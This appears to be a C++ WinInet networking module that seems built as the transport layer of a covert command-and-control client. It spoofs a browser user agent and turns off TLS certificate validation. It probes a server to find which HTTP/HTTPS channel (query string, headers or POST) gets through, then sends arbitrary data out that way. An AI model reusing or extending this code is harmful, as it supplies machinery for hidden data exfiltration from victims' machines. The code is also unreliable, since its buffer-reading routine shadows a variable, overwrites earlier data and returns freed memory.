#include "stdafx.h"
#include "globalvars.h"
#include "http.h"

/*
Read any size data from http server
Each time it adds new data to the received data and returns it, 
as well as returns the number of bytes received from the server.
And also returns the total number of output data
return:
NULL - FAILED
char* - All data including newly received from the network
DWORD &dwByteRead - The number of bytes received after the last request to the server
DWORD &dwAllByteRead - All bytes including newly received from the network
*/
char* readNetData(HINTERNET hRequest, char* AllData, DWORD packetSize, DWORD &dwByteRead, DWORD &dwAllByteRead)
{
    char szData[4048] = { 0 };
    BOOL isRead = InternetReadFile(hRequest, szData, packetSize, &dwByteRead);
    if (isRead == FALSE || dwByteRead == 0)
    {
        dwByteRead = 0;
        return AllData;
    }

    if (AllData == NULL)
    {
        char* AllData = (char*)VirtualAlloc(NULL, 4068, MEM_COMMIT, PAGE_READWRITE);
        if (AllData == NULL)
        {
            dwByteRead = 0;
            return AllData;
        }
        memcpy_s(AllData, 4048, szData, dwByteRead);
        dwAllByteRead = dwByteRead;
        return AllData;
    }
    else {
        int dwAddLen = dwAllByteRead + 4048;
        char* tmpData = (char*)VirtualAlloc(NULL, (dwAddLen + 8), MEM_COMMIT, PAGE_READWRITE);
        if (tmpData == NULL)
        {
            dwByteRead = 0;
            return AllData;
        }
        memcpy_s(tmpData, dwAddLen, AllData, dwAllByteRead);
        memcpy_s(tmpData, dwAddLen, szData, dwByteRead);
        VirtualFree(AllData, 0, MEM_RELEASE);
        dwAllByteRead = dwAllByteRead + dwByteRead;
        return AllData;
    }
    return NULL;
}

/*
Function:
Send universal HTTP/HTTPS request Get/Post/Header

vars:
bool secureFlag - If set to 'true' a secure channel will be used HTTPS, if set to 'false'channel will be use HTTP
char* server - Server domain name
char* page - Page url, example: '/someurl/do.php' 
char* params - Page params, example 'id=1&job=ABEF5103534666F5A4FDEF37F705B2CB7F0C4F'
int packetSize - The general parameter, not used, is adjusted inside the function automatically if the data is greater than 4048 bytes.
char* addHeader - Data that can be passed in the request header, example 'job: ABEF5103534666F5A4FDEF37F705B2CB7F0C4F'
char* postData - Data prepared for a POST query 
return:
NULL - FAILED
char* - return Server answer text
*/
char* SendHTTPSRequest_GET(bool secureFlag, char* server, char* page, char* params, int packetSize, char* addHeader, char* postData)
{
    //char szData[808]={0};	
    HINTERNET hConnect = NULL;
    HINTERNET hInternet = NULL;
    HINTERNET hRequest = NULL;
    BOOL isSend = false;
    DWORD res = 0;
    if (packetSize > 4048) packetSize = 4048;

    char* AllData = NULL;
    DWORD dwAllByteRead = 0;

    hInternet = InternetOpen(TEXT("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) return NULL;


    std::string serverAnswer;
    if (secureFlag == true)
    {
        hConnect = InternetConnectA(hInternet, server, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    }
    else {
        hConnect = InternetConnectA(hInternet, server, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    }

    if (hConnect != NULL)
    {
        std::string request;
        if (page == NULL)
        {
            request.append("/", 1);
        }
        else {
            if (page[0] == '/')
            {
                request.append(page, strlen(page));
            }
            else {
                request.append("/", 1);
                request.append(page, strlen(page));
            }
        }
        if (params != NULL)
        {
            request.append("?", 1);
            request.append(params, strlen(params));
        }

        std::string RequestStyle;
        if (postData == NULL)
        {
            RequestStyle = "GET";
        }
        else {
            RequestStyle = "POST";
        }

        if (secureFlag == true)
        {
            hRequest = HttpOpenRequestA(hConnect, RequestStyle.c_str(), request.c_str(), NULL, NULL, 0, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE, 1);
        }
        else {
            hRequest = HttpOpenRequestA(hConnect, RequestStyle.c_str(), request.c_str(), NULL, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION, 1);
        }
        request.clear();
        RequestStyle.clear();

        if (hRequest != NULL)
        {
            //If need work with BAD SSL
            DWORD dwFlags;
            DWORD dwBuffLen = sizeof(dwFlags);
            BOOL Bres = 0;
            Bres = InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen);
            dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
            Bres = InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
            //If need work with BAD SSL
            if (postData == NULL)
            {
                if (addHeader == NULL)
                {
                    isSend = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
                }
                else
                {
                    isSend = HttpSendRequestA(hRequest, addHeader, strlen(addHeader), NULL, 0);
                }
            }
            else {
                std::string strHeader;
                char xform[] = "Content-Type: application/x-www-form-urlencoded\r\n";
                strHeader.append(xform, strlen(xform));
                if (addHeader == NULL)
                {
                    isSend = HttpSendRequestA(hRequest, strHeader.c_str(), strHeader.length(), postData, strlen(postData));
                }
                else
                {
                    strHeader.append(addHeader, strlen(addHeader));
                    isSend = HttpSendRequestA(hRequest, strHeader.c_str(), strHeader.length(), postData, strlen(postData));
                }
                strHeader.clear();
            }
            /*
            res = GetLastError();
            if (res == ERROR_INTERNET_INVALID_CA)
            {
            DWORD dwFlags;
            DWORD dwBuffLen = sizeof(dwFlags);
            BOOL Bres = 0;
            Bres = InternetQueryOptionA (hRequest, INTERNET_OPTION_SECURITY_FLAGS,(LPVOID)&dwFlags, &dwBuffLen);
            dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
            Bres = InternetSetOptionA ( hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
            isSend = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
            }
            */
            if (isSend)
            {
                DWORD dwByteRead = 0;
                for (;;)
                {
                    dwByteRead = 0;
                    AllData = readNetData(hRequest, AllData, packetSize, dwByteRead, dwAllByteRead);
                    if (AllData == NULL || dwByteRead == 0) break;
                }
            }

            // close request
            InternetCloseHandle(hRequest);
        }
        // close session
        InternetCloseHandle(hConnect);
    }
    // close WinInet
    InternetCloseHandle(hInternet);

    return AllData;
}

/*
Function:
Interrogates the server for its survivability.
Sends a request with the text 'ping' and waits for a response 'pong'
If the response is received, the server is considered alive and it is possible to work with it further.

vars:
char* ServerName - Server domain name

return:
int 0 - FAILED
int 1 - OK
*/
int doPingServer(char* ServerName)
{
    int packetSize = 240;
    bool secureFlag = false;
    char* answer = NULL;
    char* addToHeader1 = NULL;
    char* addToHeader2 = "Coder: Hello, World";
    char* postData1 = NULL;
    char* postData2 = "test=This+is+first+POST+data&testval=kremlins";
    char* getParams1 = NULL;
    char* getParams2 = "login=value1&password=test";
    char* pageParam1 = NULL;
    char* pageParam2 = "/cp2.php";

    DWORD dwCounter = 0;
    for (;;)
    {
        answer = SendHTTPSRequest_GET(secureFlag, ServerName, "/ping.php", getParams1, packetSize, addToHeader1, postData1);
        if (answer == NULL) return 0;
        printf("%d %s\r\n", dwCounter++, answer);
        VirtualFree(answer, 0, MEM_RELEASE);
        Sleep(100);
        return 1;
    }

    return 0;
}

/*
Function:
The function to find the fastest and most secure way to transfer data on the protocole http/https
vars:
char* CheckServer - Server domain name

return:
int 0 - FAILED
int > 0 The fastest and most secure way to transfer data
*/
int SelectBestHttpTraffic(char* CheckServer)
{
    int packetSize = 4048;
    bool secureFlag = false;
    char* answer = NULL;
    char* addToHeader1 = NULL;
    char* addToHeader2 = "ping: ping";
    char* postData1 = NULL;
    char* postData2 = "ping=ping";
    char* getParams1 = NULL;
    char* getParams2 = "ping=ping";
    char* pageParam1 = NULL;
    char* pageParam2 = "/best.php";
    int bbProto = 0;
    char* pong = "pong";

    answer = SendHTTPSRequest_GET(secureFlag, CheckServer, pageParam2, getParams2, packetSize, addToHeader1, postData1);
    if (answer != NULL)
    {
        if (strstr(answer, pong))
        {
            bbProto = 1;
            //printf("Test HTTP Get param: %s\r\n", answer);
        }
        VirtualFree(answer, 0, MEM_RELEASE);
        answer = NULL;
    }

    answer = SendHTTPSRequest_GET(secureFlag, CheckServer, pageParam2, getParams1, packetSize, addToHeader2, postData1);
    if (answer != NULL)
    {
        if (strstr(answer, pong))
        {
            bbProto = 2;
            //printf("Test HTTP Header param: %s\r\n", answer);
        }
        VirtualFree(answer, 0, MEM_RELEASE);
        answer = NULL;
    }

    answer = SendHTTPSRequest_GET(secureFlag, CheckServer, pageParam2, getParams1, packetSize, addToHeader1, postData2);
    if (answer != NULL)
    {
        if (strstr(answer, pong))
        {
            bbProto = 3;
            //printf("Test HTTP POST param: %s\r\n", answer);
        }
        VirtualFree(answer, 0, MEM_RELEASE);
        answer = NULL;
    }

    answer = SendHTTPSRequest_GET(true, CheckServer, pageParam2, getParams2, packetSize, addToHeader1, postData1);
    if (answer != NULL)
    {
        if (strstr(answer, pong))
        {
            bbProto = 4;
            //printf("Test HTTPS Get param: %s\r\n", answer);
        }
        VirtualFree(answer, 0, MEM_RELEASE);
        answer = NULL;
    }

    answer = SendHTTPSRequest_GET(true, CheckServer, pageParam2, getParams1, packetSize, addToHeader2, postData1);
    if (answer != NULL)
    {
        if (strstr(answer, pong))
        {
            bbProto = 5;
            //printf("Test HTTPS Header param: %s\r\n", answer);
        }
        VirtualFree(answer, 0, MEM_RELEASE);
        answer = NULL;
    }

    answer = SendHTTPSRequest_GET(true, CheckServer, pageParam2, getParams1, packetSize, addToHeader1, postData2);
    if (answer != NULL)
    {
        if (strstr(answer, pong))
        {
            bbProto = 6;
            //printf("Test HTTPS POST param: %s\r\n", answer);
        }
        VirtualFree(answer, 0, MEM_RELEASE);
        answer = NULL;
    }
    return bbProto;
}

/*
Function:
Sends data to the server, but automatically choosing the best data transfer option

vars:
char* ServerName - Server domain name
char* stringData - Data to be sent to the server

return:
NULL - FAILED
char* - Server answer
*/
char* SendPacketData(char* ServerName, char* stringData)
{
    if (bestType == 1) return SendDataGET(ServerName, stringData);
    if (bestType == 2) return SendDataHEAD(ServerName, stringData);
    if (bestType == 3) return SendDataPOST(ServerName, stringData);
    if (bestType == 4) return SendSSLDataGET(ServerName, stringData);
    if (bestType == 5) return SendSSLDataHEAD(ServerName, stringData);
    if (bestType == 6) return SendSSLDataPOST(ServerName, stringData);
    return NULL;
}

/*
Function:
Sends data to the http server using POST request

vars:
char* ServerName - Server domain name
char* stringData - Data to be sent to the server

return:
NULL - FAILED
char* - Server answer
*/
char* SendDataPOST(char* ServerName, char* stringData)
{
    if (stringData == NULL) return NULL;
    if (ServerName == NULL) return NULL;

    int packetSize = strlen(stringData);

    return SendHTTPSRequest_GET(false, ServerName, "/post.php", NULL, packetSize, NULL, stringData);
}

/*
Function:
Sends data to the https server using POST request

vars:
char* ServerName - Server domain name
char* stringData - Data to be sent to the server

return:
NULL - FAILED
char* - Server answer
*/
char* SendSSLDataPOST(char* ServerName, char* stringData)
{
    if (stringData == NULL) return NULL;
    if (ServerName == NULL) return NULL;

    int packetSize = strlen(stringData);

    return SendHTTPSRequest_GET(true, ServerName, "/post.php", NULL, packetSize, NULL, stringData);
}

/*
Function:
Sends data to the http server using GET request

vars:
char* ServerName - Server domain name
char* stringData - Data to be sent to the server

return:
NULL - FAILED
char* - Server answer
*/
char* SendDataGET(char* ServerName, char* stringData)
{
    if (stringData == NULL) return NULL;
    if (ServerName == NULL) return NULL;

    int packetSize = strlen(stringData);

    return SendHTTPSRequest_GET(false, ServerName, "/get.php", stringData, packetSize, NULL, NULL);
}

/*
Function:
Sends data to the https server using GET request

vars:
char* ServerName - Server domain name
char* stringData - Data to be sent to the server

return:
NULL - FAILED
char* - Server answer
*/
char* SendSSLDataGET(char* ServerName, char* stringData)
{
    if (stringData == NULL) return NULL;
    if (ServerName == NULL) return NULL;

    int packetSize = strlen(stringData);

    return SendHTTPSRequest_GET(true, ServerName, "/get.php", stringData, packetSize, NULL, NULL);
}

/*
Function:
Sends data to the https server using headers

vars:
char* ServerName - Server domain name
char* stringData - Data to be sent to the server

return:
NULL - FAILED
char* - Server answer
*/
char* SendSSLDataHEAD(char* ServerName, char* stringData)
{
    if (stringData == NULL) return NULL;
    if (ServerName == NULL) return NULL;

    int packetSize = strlen(stringData);

    return SendHTTPSRequest_GET(true, ServerName, "/head.php", NULL, packetSize, stringData, NULL);
}

/*
Function:
Sends data to the http server using headers

vars:
char* ServerName - Server domain name
char* stringData - Data to be sent to the server

return:
NULL - FAILED
char* - Server answer
*/
char* SendDataHEAD(char* ServerName, char* stringData)
{
    if (stringData == NULL) return NULL;
    if (ServerName == NULL) return NULL;

    int packetSize = strlen(stringData);

    return SendHTTPSRequest_GET(false, ServerName, "/head.php", NULL, packetSize, stringData, NULL);
}
